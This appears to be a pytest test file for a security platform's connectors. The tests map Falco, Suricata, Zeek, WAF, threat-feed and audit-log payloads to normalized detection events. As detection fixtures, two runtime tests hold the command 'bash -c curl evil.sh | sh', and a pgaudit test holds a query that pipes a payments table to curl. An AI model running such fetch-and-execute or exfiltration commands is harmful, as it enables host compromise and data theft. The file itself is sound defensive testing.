from __future__ import annotations

import pytest

from app.integrations.connectors import list_connectors, map_external_event


def test_list_connectors_includes_expected_keys():
    keys = {item["key"] for item in list_connectors()}
    assert "splunk_login_v1" in keys
    assert "core_banking_tx_v1" in keys
    assert "cloudflare_ddos_v1" in keys
    assert "telco_sim_swap_v1" in keys
    assert "local_network_probe_v1" in keys
    assert "pgaudit_event_v1" in keys
    assert "wazuh_fim_v1" in keys
    assert "crowdsec_alert_v1" in keys
    assert "falco_runtime_v1" in keys
    assert "tetragon_runtime_v1" in keys
    assert "coraza_waf_v1" in keys
    assert "suricata_eve_v1" in keys
    assert "zeek_notice_v1" in keys
    assert "feodo_c2_v1" in keys
    assert "urlhaus_ioc_v1" in keys
    assert "threatfox_ioc_v1" in keys
    assert "malwarebazaar_sample_v1" in keys
    assert "otx_indicator_v1" in keys
    assert "velociraptor_artifact_v1" in keys
    assert "m365_bec_mail_v1" in keys
    assert "waf_api_attack_v1" in keys
    assert "kev_vuln_feed_v1" in keys
    assert "backup_attestation_v1" in keys
    assert "vpn_gateway_session_v1" in keys


def test_map_splunk_login_event():
    ev = map_external_event(
        connector_key="splunk_login_v1",
        payload={
            "_time": "2026-02-13T10:45:00Z",
            "user": "alice",
            "status": "failed",
            "src_ip": "1.2.3.4",
            "ua": "Mozilla/5.0",
        },
        confidence=0.8,
    )

    assert ev.event_type == "LOGIN_EVENT"
    assert ev.payload["username"] == "alice"
    assert ev.payload["outcome"] == "failure"
    assert ev.anchors["ip"] == "1.2.3.4"


def test_map_core_banking_event_derives_account_anchor_when_ip_missing():
    ev = map_external_event(
        connector_key="core_banking_tx_v1",
        payload={
            "transaction_time": "2026-02-13T11:00:00Z",
            "from_account": "ACC-001",
            "to_account": "ACC-002",
            "amount": 1500,
            "currency": "KES",
        },
        confidence=0.9,
    )

    assert ev.event_type == "TRANSACTION_EVENT"
    assert ev.payload["account_from"] == "ACC-001"
    assert ev.payload["account_to"] == "ACC-002"
    assert ev.anchors.get("account_h")


def test_map_unknown_connector_raises():
    with pytest.raises(ValueError) as e:
        map_external_event(connector_key="unknown", payload={})
    assert "unknown connector" in str(e.value)


def test_map_local_network_probe_to_service_health_event():
    ev = map_external_event(
        connector_key="local_network_probe_v1",
        payload={
            "timestamp": "2026-02-13T12:30:00Z",
            "hostname": "workstation-01",
            "interface": "eth0",
            "default_gateway": "192.168.1.1",
            "dns_servers": ["1.1.1.1", "8.8.8.8"],
            "rx_bytes": 1024,
            "tx_bytes": 2048,
            "rx_bps": 100.5,
            "tx_bps": 200.5,
            "link_up": True,
        },
        confidence=0.86,
    )

    assert ev.event_type == "SERVICE_HEALTH_EVENT"
    assert ev.payload["service_id"] == "local-network:workstation-01:eth0"
    assert ev.payload["status"] == "up"
    assert ev.payload["gateway"] == "192.168.1.1"
    assert ev.payload["dns_servers"] == ["1.1.1.1", "8.8.8.8"]
    assert ev.anchors["service_id"] == "local-network:workstation-01:eth0"


def test_map_pgaudit_event_to_db_audit_event():
    ev = map_external_event(
        connector_key="pgaudit_event_v1",
        payload={
            "timestamp": "2026-02-14T08:00:00Z",
            "db_instance": "pg-primary-01",
            "db_name": "ifmis",
            "db_user": "svc_audit",
            "statement_type": "COPY",
            "table": "payments_2026",
            "query": "COPY payments_2026 TO PROGRAM 'curl ...'",
            "success": True,
            "audit_setting_changed": True,
        },
        confidence=0.95,
    )

    assert ev.event_type == "DB_AUDIT_EVENT"
    assert ev.anchors["service_id"] == "pg-primary-01"
    assert ev.payload["statement_type"] == "COPY"
    assert "query_fingerprint" in ev.payload
    assert "high_impact_db_statement" in ev.payload["reason_codes"]
    assert "audit_config_changed" in ev.payload["reason_codes"]


def test_map_wazuh_fim_event_to_file_integrity_event():
    ev = map_external_event(
        connector_key="wazuh_fim_v1",
        payload={
            "timestamp": "2026-02-14T08:05:00Z",
            "hostname": "county-finance-db-01",
            "path": "/var/backups/ifmis/ledger.sql.gz",
            "action": "deleted",
            "critical_path": True,
            "user": "root",
            "process_name": "rm",
        },
        confidence=0.9,
    )

    assert ev.event_type == "FILE_INTEGRITY_EVENT"
    assert ev.payload["action"] == "deleted"
    assert ev.payload["is_critical_path"] is True
    assert "file_deleted" in ev.payload["reason_codes"]
    assert "critical_path_mutation" in ev.payload["reason_codes"]
    assert ev.anchors["device_id"] == "county-finance-db-01"


def test_map_crowdsec_alert_to_dfir_finding_event():
    ev = map_external_event(
        connector_key="crowdsec_alert_v1",
        payload={
            "created_at": "2026-02-14T08:07:00Z",
            "scenario": "crowdsecurity/http-bf",
            "scope": "ip",
            "value": "41.90.0.10",
            "service_id": "ecitizen-api",
            "remediation": True,
            "decisions": ["ban"],
            "events_count": 17,
            "country": "KE",
        },
        confidence=0.91,
    )

    assert ev.event_type == "DFIR_FINDING_EVENT"
    assert ev.payload["source"] == "crowdsec"
    assert ev.payload["artifact_name"] == "crowdsecurity/http-bf"
    assert "remediation_available" in ev.payload["reason_codes"]
    assert ev.anchors["ip"] == "41.90.0.10"
    assert ev.anchors["service_id"] == "ecitizen-api"


def test_map_falco_runtime_to_dfir_finding_event():
    ev = map_external_event(
        connector_key="falco_runtime_v1",
        payload={
            "output_time": "2026-02-14T08:08:00Z",
            "rule": "Write below binary dir",
            "priority": "Warning",
            "hostname": "worker-01",
            "output": "File below a binary dir opened for writing",
            "output_fields": {
                "container.id": "abc123",
                "container.name": "payments-api",
                "k8s.pod.name": "payments-api-7689",
                "k8s.ns.name": "prod",
                "proc.name": "bash",
                "proc.cmdline": "bash -c curl evil.sh | sh",
                "fd.name": "/usr/bin/curl",
                "user.name": "root",
            },
            "tags": ["filesystem", "mitre_execution"],
        },
        confidence=0.92,
    )

    assert ev.event_type == "DFIR_FINDING_EVENT"
    assert ev.payload["source"] == "falco"
    assert ev.payload["artifact_name"] == "Write below binary dir"
    assert ev.payload["container_name"] == "payments-api"
    assert "tag:filesystem" in ev.payload["reason_codes"]
    assert ev.anchors["service_id"] == "payments-api-7689"
    assert ev.anchors["device_id"] == "worker-01"
    assert ev.anchors["endpoint"] == "/usr/bin/curl"


def test_map_tetragon_runtime_to_dfir_finding_event():
    ev = map_external_event(
        connector_key="tetragon_runtime_v1",
        payload={
            "event_time": "2026-02-14T08:09:00Z",
            "event_type": "process_exec",
            "policy_name": "suspicious-shell",
            "verdict": "denied",
            "hostname": "worker-02",
            "pod_name": "identity-api-554f",
            "namespace": "prod",
            "workload": "identity-api",
            "process_name": "bash",
            "command_line": "bash -c curl evil.sh | sh",
            "file_path": "/usr/bin/bash",
        },
        confidence=0.93,
    )

    assert ev.event_type == "DFIR_FINDING_EVENT"
    assert ev.payload["source"] == "tetragon"
    assert ev.payload["artifact_name"] == "suspicious-shell"
    assert "runtime_enforcement_triggered" in ev.payload["reason_codes"]
    assert ev.anchors["service_id"] == "identity-api-554f"
    assert ev.anchors["device_id"] == "worker-02"


def test_map_coraza_waf_to_web_attack_event():
    ev = map_external_event(
        connector_key="coraza_waf_v1",
        payload={
            "timestamp": "2026-02-14T08:11:00Z",
            "host": "api.gov.ke",
            "uri": "/v1/payments",
            "rule_id": "942100",
            "attack_type": "sql_injection",
            "action": "denied",
            "remote_addr": "41.90.0.10",
            "request_method": "POST",
            "request_headers.user-agent": "curl/8.0",
            "tx_id": "tx-1",
        },
        confidence=0.94,
    )

    assert ev.event_type == "WEB_ATTACK_EVENT"
    assert ev.payload["source"] == "coraza"
    assert ev.payload["attack_type"] == "sql_injection"
    assert ev.payload["status"] == "blocked"
    assert "coraza_rule:942100" in ev.payload["reason_codes"]
    assert ev.anchors["service_id"] == "api.gov.ke"
    assert ev.anchors["ip"] == "41.90.0.10"


def test_map_suricata_web_alert_to_web_attack_event():
    ev = map_external_event(
        connector_key="suricata_eve_v1",
        payload={
            "timestamp": "2026-02-14T08:10:00Z",
            "src_ip": "41.90.0.10",
            "dest_ip": "196.201.214.10",
            "dest_port": 443,
            "proto": "TCP",
            "app_proto": "http",
            "alert": {
                "signature": "ET WEB_SERVER SQL Injection Attempt",
                "category": "Web Application Attack",
                "severity": 1,
                "action": "allowed",
            },
            "http": {
                "hostname": "api.gov.ke",
                "url": "/v1/payments",
                "http_method": "POST",
                "http_user_agent": "curl/8.0",
            },
            "flow": {
                "pkts_toserver": 42,
                "bytes_toserver": 8192,
            },
        },
        confidence=0.93,
    )

    assert ev.event_type == "WEB_ATTACK_EVENT"
    assert ev.payload["source"] == "suricata"
    assert ev.payload["attack_type"] == "sql_injection"
    assert ev.payload["status"] == "allowed"
    assert ev.anchors["service_id"] == "api.gov.ke"
    assert ev.anchors["endpoint"] == "/v1/payments"
    assert ev.anchors["ip"] == "41.90.0.10"


def test_map_suricata_ddos_alert_to_ddos_signal_event():
    ev = map_external_event(
        connector_key="suricata_eve_v1",
        payload={
            "timestamp": "2026-02-14T08:12:00Z",
            "src_ip": "198.51.100.25",
            "dest_ip": "196.201.214.11",
            "dest_port": 443,
            "proto": "UDP",
            "service_id": "huduma-api",
            "alert": {
                "signature": "SURICATA UDP Flood Potential DDoS",
                "category": "Attempted Denial of Service",
                "severity": 2,
                "action": "blocked",
            },
            "flow": {
                "pkts_toserver": 2400,
                "bytes_toserver": 250000,
            },
        },
        confidence=0.95,
    )

    assert ev.event_type == "DDOS_SIGNAL_EVENT"
    assert ev.payload["source"] == "suricata"
    assert ev.payload["service_id"] == "huduma-api"
    assert ev.payload["status"] == "blocked"
    assert ev.payload["packet_burst"] == 2400
    assert ev.anchors["service_id"] == "huduma-api"
    assert ev.anchors["ip"] == "198.51.100.25"


def test_map_zeek_notice_to_dfir_finding_event():
    ev = map_external_event(
        connector_key="zeek_notice_v1",
        payload={
            "ts": "2026-02-14T08:20:00Z",
            "note": "SSH::Password_Guessing",
            "msg": "198.51.100.10 appears to be guessing SSH passwords",
            "src": "198.51.100.10",
            "dst": "10.0.0.10",
            "host": "bastion.internal",
            "proto": "tcp",
            "p": 22,
            "uid": "C4xA1b2c3",
            "peer_descr": "zeek-sensor-1",
        },
        confidence=0.9,
    )

    assert ev.event_type == "DFIR_FINDING_EVENT"
    assert ev.payload["source"] == "zeek"
    assert ev.payload["artifact_name"] == "SSH::Password_Guessing"
    assert "credential_attack_signal" in ev.payload["reason_codes"]
    assert ev.anchors["service_id"] == "bastion.internal"
    assert ev.anchors["ip"] == "198.51.100.10"


def test_map_velociraptor_artifact_to_dfir_finding_event():
    ev = map_external_event(
        connector_key="velociraptor_artifact_v1",
        payload={
            "timestamp": "2026-02-14T08:15:00Z",
            "host": "gov-mail-01",
            "artifact": "Windows.Detection.EventLogs",
            "finding_type": "eventlog_cleared",
            "severity": "high",
            "eventlog_cleared": True,
            "user": "administrator",
        },
        confidence=0.88,
    )

    assert ev.event_type == "DFIR_FINDING_EVENT"
    assert ev.payload["artifact_name"] == "Windows.Detection.EventLogs"
    assert ev.payload["severity"] == "high"
    assert "log_tamper_signal" in ev.payload["reason_codes"]
    assert ev.anchors["service_id"] == "endpoint:gov-mail-01"


def test_map_feodo_c2_to_dfir_finding_event():
    ev = map_external_event(
        connector_key="feodo_c2_v1",
        payload={
            "first_seen_utc": "2026-03-09T12:00:00Z",
            "ip_address": "198.51.100.10",
            "malware": "qakbot",
            "status": "online",
            "port": 443,
        },
        confidence=0.95,
    )

    assert ev.event_type == "DFIR_FINDING_EVENT"
    assert ev.anchors["ip"] == "198.51.100.10"
    assert ev.payload["source"] == "feodo_tracker"
    assert ev.payload["finding_type"] == "botnet_c2_indicator"
    assert "botnet_c2_indicator" in ev.payload["reason_codes"]


def test_map_urlhaus_ioc_to_dfir_finding_event():
    ev = map_external_event(
        connector_key="urlhaus_ioc_v1",
        payload={
            "date_added": "2026-03-09T12:05:00Z",
            "url": "http://mal.example/payload.exe",
            "host": "mal.example",
            "host_ip": "203.0.113.55",
            "threat": "malware_url",
            "url_status": "online",
        },
        confidence=0.91,
    )

    assert ev.event_type == "DFIR_FINDING_EVENT"
    assert ev.anchors["url"] == "http://mal.example/payload.exe"
    assert ev.anchors["domain"] == "mal.example"
    assert ev.anchors["ip"] == "203.0.113.55"
    assert ev.payload["source"] == "urlhaus"


def test_map_threatfox_ioc_to_dfir_finding_event():
    ev = map_external_event(
        connector_key="threatfox_ioc_v1",
        payload={
            "timestamp": "2026-03-09T12:07:00Z",
            "indicator": "203.0.113.66",
            "indicator_type": "ip",
            "malware": "qakbot",
            "status": "active",
            "tags": ["botnet"],
        },
        confidence=0.92,
    )

    assert ev.event_type == "DFIR_FINDING_EVENT"
    assert ev.anchors["ip"] == "203.0.113.66"
    assert ev.payload["source"] == "threatfox"
    assert ev.payload["finding_type"] == "qakbot"
    assert "feed:threatfox" in ev.payload["reason_codes"]


def test_map_malwarebazaar_sample_to_dfir_finding_event():
    ev = map_external_event(
        connector_key="malwarebazaar_sample_v1",
        payload={
            "timestamp": "2026-03-09T12:08:00Z",
            "sha256_hash": "ab" * 32,
            "malware_family": "win.qakbot",
            "file_name": "dropper.exe",
            "delivery_url": "http://mal.example/dropper.exe",
        },
        confidence=0.93,
    )

    assert ev.event_type == "DFIR_FINDING_EVENT"
    assert ev.anchors["endpoint"] == f"sha256:{'ab' * 32}"
    assert ev.anchors["url"] == "http://mal.example/dropper.exe"
    assert ev.payload["source"] == "malwarebazaar"
    assert ev.payload["sha256"] == "ab" * 32


def test_map_vpn_gateway_session_to_login_event():
    ev = map_external_event(
        connector_key="vpn_gateway_session_v1",
        payload={
            "timestamp": "2026-03-09T12:09:00Z",
            "src_ip": "10.0.0.5",
            "dst_ip": "198.51.100.10",
            "provider": "OpenVPN",
            "protocol": "udp",
        },
        confidence=0.9,
    )

    assert ev.event_type == "LOGIN_EVENT"
    assert ev.anchors["ip"] == "10.0.0.5"
    assert ev.anchors["device_id"] == "198.51.100.10"
    assert ev.payload["provider"] == "OpenVPN"


def test_map_otx_indicator_to_dfir_finding_event():
    ev = map_external_event(
        connector_key="otx_indicator_v1",
        payload={
            "first_seen": "2026-03-09T12:10:00Z",
            "indicator": "bad.example",
            "indicator_type": "domain",
            "pulse_name": "Kenya-targeted phishing",
            "tags": ["phishing", "otx"],
        },
        confidence=0.9,
    )

    assert ev.event_type == "DFIR_FINDING_EVENT"
    assert ev.anchors["domain"] == "bad.example"
    assert ev.payload["artifact_name"] == "Kenya-targeted phishing"
    assert ev.payload["finding_type"] == "otx_domain"


def test_map_waf_api_attack_to_web_attack_event():
    ev = map_external_event(
        connector_key="waf_api_attack_v1",
        payload={
            "timestamp": "2026-02-14T10:20:00Z",
            "service_id": "gov-api-portal",
            "endpoint": "/v1/payments",
            "attack_type": "sql_injection",
            "decision": "allowed",
            "src_ip": "41.90.0.10",
        },
        confidence=0.91,
    )

    assert ev.event_type == "WEB_ATTACK_EVENT"
    assert ev.payload["status"] == "allowed"
    assert "waf_bypass_signal" in ev.payload["reason_codes"]
    assert ev.anchors["service_id"] == "gov-api-portal"
    assert ev.anchors["ip"] == "41.90.0.10"


def test_map_kev_vuln_to_vulnerability_event():
    ev = map_external_event(
        connector_key="kev_vuln_feed_v1",
        payload={
            "published_at": "2026-02-14T10:30:00Z",
            "asset_id": "county-finance-db-01",
            "cve": "cve-2026-1001",
            "severity": "critical",
            "known_exploited": True,
            "epss": 0.87,
            "cisa_due_date": "2026-03-01T00:00:00Z",
        },
        confidence=0.93,
    )

    assert ev.event_type == "VULNERABILITY_EVENT"
    assert ev.payload["cve_id"] == "CVE-2026-1001"
    assert ev.payload["kev"] is True
    assert ev.anchors["service_id"] == "county-finance-db-01"


def test_map_backup_attestation_to_backup_event():
    ev = map_external_event(
        connector_key="backup_attestation_v1",
        payload={
            "attested_at": "2026-02-14T10:40:00Z",
            "asset_id": "ifmis-db-01",
            "backup_id": "snap-123",
            "immutable": False,
            "status": "risk",
        },
        confidence=0.8,
    )

    assert ev.event_type == "BACKUP_ATTESTATION_EVENT"
    assert ev.payload["backup_id"] == "snap-123"
    assert ev.payload["status"] == "risk"
    assert ev.anchors["service_id"] == "ifmis-db-01"
